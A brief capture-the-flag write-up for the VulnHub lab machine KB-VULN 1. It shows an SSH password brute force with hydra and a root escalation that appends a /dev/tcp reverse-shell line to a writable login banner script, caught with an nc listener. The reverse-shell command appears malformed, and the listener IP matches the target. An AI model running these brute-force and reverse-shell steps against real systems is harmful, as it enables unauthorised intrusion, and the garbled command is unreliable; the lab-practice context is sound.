# KB-VULN: 1

[Machine](https://www.vulnhub.com/entry/kb-vuln-1,540/ "https://www.vulnhub.com/entry/kb-vuln-1,540/")

Too easy box =_=

## Reconnaissance

### nmap

* 21 - ftp
* 22 - ssh
* 80 - http

### ftp 

`ls -a` will show .bash_history hidden file. In which you'll the modification of the file 00-header with nano. `00-header` is just a script that will be executed when you log in. 

### web

I did a lot of enumeration on this service with `whatweb`, `nikto`, `dirb`...But I complicated it...

#### Credentials

Here just a comment in the source code. Username: sysadmin. I also did a lot of enumeration because of this username. I didn't think about ssh :)

## Thread modeling

Brute-force the ssh with hydra and then do privilege escalation with the 00-header file.

## Vulnerability analysis

* Information leakage.
* Easy password.
* Wrong permissions of the important script.

## Exploitation

```
hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt 192.168.88.225 ssh -o sysadmin_pass.txt
```

Next ssh log in.

## Post exploitation

echo 'bash -i "bash -c >& /dev/tcp/192.168.88.225/4444 0>&1"' >> /etc/update-motd.d/00-header

ssh log in again with `nc -lnvp 4444` on your machine.

Got root.


